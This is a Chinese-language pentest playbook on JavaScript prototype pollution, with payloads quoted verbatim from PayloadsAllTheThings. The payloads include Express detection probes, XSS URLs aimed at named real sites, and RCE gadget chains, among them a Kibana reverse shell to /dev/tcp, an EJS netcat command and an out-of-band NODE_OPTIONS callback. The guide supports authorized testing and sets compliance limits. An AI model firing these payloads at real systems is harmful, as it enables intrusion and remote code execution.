# 原型污染（Prototype Pollution，CSPP / SSPP）

> JavaScript 里几乎所有对象继承 `Object.prototype`；攻击者经 `__proto__` / `constructor.prototype` 写入原型属性，则**所有继承对象全部中招**——一次污染，全局生效。客户端污染（CSPP，URL 片段/查询参数进 sink）→ XSS / 绕过前端 sanitizer；服务端污染（SSPP，JSON body 经 `JSON.parse` 后被递归合并）→ 改 Express 行为 / Node gadget → RCE。Node 后端 + 前端框架（Vue/React 模板合并）命中率不低，常被当"参数乱码"漏掉。

**取材来源**：[PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings)（Prototype Pollution 章节，payload 逐字摘录）；权威公开源 PortSwigger / HackTricks。

---

## 1. 触发信号

- 后端 Node.js / Express（响应头 `X-Powered-By: Express`、报错栈含 `node`）；前端 Vue/React/jQuery（`$.extend`、深合并配置对象）。
- 请求 body/参数被服务端或前端**深合并**进对象（`merge`/`extend`/`defaultsDeep`/lodash `_.merge` 家族）。
- JSON body 里发 `{"__proto__":{"x":"y"}}` 后应用行为出现**全局性**变化（所有响应/所有用户受影响）。

> 路由规则：客户端 sink（URL 进前端 JS）→ §4.2；服务端 sink（JSON body 进 Node）→ §4.1 黑盒检测 → §4.3 gadget 链。与 Mass Assignment 区分：MA 是**多写业务字段**，PP 是**污染原型影响所有对象**。

## 2. 高频入口点

| 侧 | sink | 入口 |
|---|---|---|
| SSPP | `JSON.parse` 后递归合并（body parser + merge） | JSON body 的 `__proto__` 键 |
| SSPP | 查询字符串转对象（qs 深解析 `?a[b]=c`） | `?__proto__[x]=y` |
| CSPP | 前端 hash/query 进 `$.extend`/深合并 | `#__proto__[x]=y` |
| CSPP | 模板引擎/Hydration 合并用户输入 | JSON 注入点 |

## 3. 探测顺序（从最无害 → 最有杀伤力）

1. **SSPP 黑盒检测（Express 行为差）**：§4.1 的 5 条检测 payload 逐条发，看响应是否出现对应全局变化（无害、自带回显）。
2. **CSPP 检测**：URL 片段/查询注入 §4.4 payload，控制台查 `Object.prototype` 是否新增属性（自测浏览器）。
3. **污染确认后找 gadget**：gadget = 应用中把被污染属性用进危险操作的代码路径；用已披露 gadget 集（§5）或源码/pp-finder 自建。
4. **影响证明**：CSPP→XSS 触发弹窗；SSPP→RCE 只在授权环境、用 `--inspect` 出网证明类 payload。
5. **默认止步**：无授权执行时，证明到「原型可污染 + 存在 gadget 路径」即停，不实际 RCE。

## 4. Payload 区（每条标注出处）

### 4.1 服务端黑盒检测（Express，无害回显）`[PayloadsAllTheThings，逐字摘录]`

```text
{ "__proto__":{"parameterLimit":1}}      + GET 带 2 个参数，至少 1 个被反射进响应
{ "__proto__":{"ignoreQueryPrefix":true}} + ??foo=bar 被解析（原 ? 前缀被忽略）
{ "__proto__":{"allowDots":true}}        + ?foo.bar=baz 被解析
{ "__proto__":{"json spaces":" "}}       + {"foo":"bar"} 响应变 {"foo": "bar"}（padding 变化）
{ "__proto__":{"status":510}}            响应状态码变 510
{ "__proto__":{"exposedHeaders":["foo"]}} 响应出现 Access-Control-Expose-Headers: foo
```

> 检测原理：污染的是**框架配置属性**，效果全局可观察且无破坏性；一次只测一条，发完观察普通请求是否受影响，及时记录原始行为作对照。

### 4.2 污染 payload 总表 `[PayloadsAllTheThings，逐字摘录]`

```js
Object.__proto__["evilProperty"]="evilPayload"
Object.__proto__.evilProperty="evilPayload"
Object.constructor.prototype.evilProperty="evilPayload"
Object.constructor["prototype"]["evilProperty"]="evilPayload"
{"__proto__": {"evilProperty": "evilPayload"}}
{"__proto__.name":"test"}
x[__proto__][abaeead] = abaeead
x.__proto__.edcbcab = edcbcab
__proto__[eedffcb] = eedffcb
__proto__.baaebfc = baaebfc
?__proto__[test]=test
```

### 4.3 RCE gadget 链（**仅授权允许 RCE 落地时**）`[PayloadsAllTheThings，逐字摘录]`

Kibana CVE-2019-7609（污染 `env` + `NODE_OPTIONS`，配合 `/proc/self/environ`）：

```js
.es(*).props(label.__proto__.env.AAAA='require("child_process").exec("bash -i >& /dev/tcp/192.168.0.136/12345 0>&1");process.exit()//')
.props(label.__proto__.env.NODE_OPTIONS='--require /proc/self/environ')
```

EJS gadget（污染 `escapeFunction` 注入 `child_process.exec`）：

```js
{
    "__proto__": {
        "client": 1,
        "escapeFunction": "JSON.stringify; process.mainModule.require('child_process').exec('id | nc localhost 4444')"
    }
}
```

异步 Node payload（argv0/shell/NODE_OPTIONS）：

```js
{
  "__proto__": {
    "argv0":"node",
    "shell":"node",
    "NODE_OPTIONS":"--inspect=payload\"\".oastify\"\".com"
  }
}
```

### 4.4 客户端（URL 注入）`[PayloadsAllTheThings，逐字摘录]`

```text
https://victim.com/#a=b&__proto__[admin]=1
https://example.com/#__proto__[xxx]=alert(1)
http://server/servicedesk/customer/user/signup?__proto__.preventDefault.__proto__.handleObj.__proto__.delegateTarget=%3Cimg/src/onerror=alert(1)%3E
https://www.apple.com/shop/buy-watch/apple-watch?__proto__[src]=image&__proto__[onerror]=alert(1)
https://www.apple.com/shop/buy-watch/apple-watch?a[constructor][prototype]=image&a[constructor][prototype][onerror]=alert(1)
```

`constructor.prototype` 变体绕过只过滤 `__proto__` 的 sink：

```js
{"constructor": {"prototype": {"foo": "bar", "json spaces": 10}}}
```

## 5. 工具用法 `[PayloadsAllTheThings]`

- [yeswehack/pp-finder](https://github.com/yeswehack/pp-finder)：从源码找 gadget
- [yuske/silent-spring](https://github.com/yuske/silent-spring)：PP→Node RCE
- [yuske/server-side-prototype-pollution](https://github.com/yuske/server-side-prototype-pollution)：Node 核心/NPM 包 SSPP gadget 集
- [BlackFan/client-side-prototype-pollution](https://github.com/BlackFan/client-side-prototype-pollution)：CSPP + script gadget 集
- [portswigger/server-side-prototype-pollution](https://github.com/portswigger/server-side-prototype-pollution)：Burp 检测扩展
- [msrkp/PPScan](https://github.com/msrkp/PPScan)：CSPP 扫描器

## 6. 证据要求

**「已确认」必须满足**：① 污染证据——注入 payload 后 `Object.prototype` 出现新属性（控制台 `console.log({}.x)` 截图）或 §4.1 框架行为差（请求/响应对）；② 影响证据——gadget 触发（XSS 弹窗 / RCE 命令回显或出网回调）；③ 说明 gadget 路径（哪个属性被哪段代码消费）。
**「疑似」**：只证明可污染（属性写入）未见影响链。

**CVSS 参考**：CSPP→XSS `AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:L/A:N ≈ 7.1`；SSPP→RCE `AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H = 10.0`（具体 CVE 以 NVD 收录 vector 为准，不凭记忆引用分数）。

## 7. 合规边界 / 不要做的事

- **禁**：RCE gadget 链只做**出网证明**（`--inspect` 指向 Collaborator / DNSlog），不反弹 shell、不写文件——反弹 shell 属 Phase 4「可执行代码」授权项。
- **禁**：对多租户/SaaS 生产环境发 SSPP 检测 payload——`status`/`json spaces` 类虽无害但全局生效，可能影响其他用户请求，报告中注明测试窗口。
- **注意**：`parameterLimit` 等检测 payload 发出后**全局持续生效**直到进程重启，测完记录所用 payload 便于厂方定位清理。
- **脱敏**：RCE 证明的命令输出只留 `id`/主机名级别。
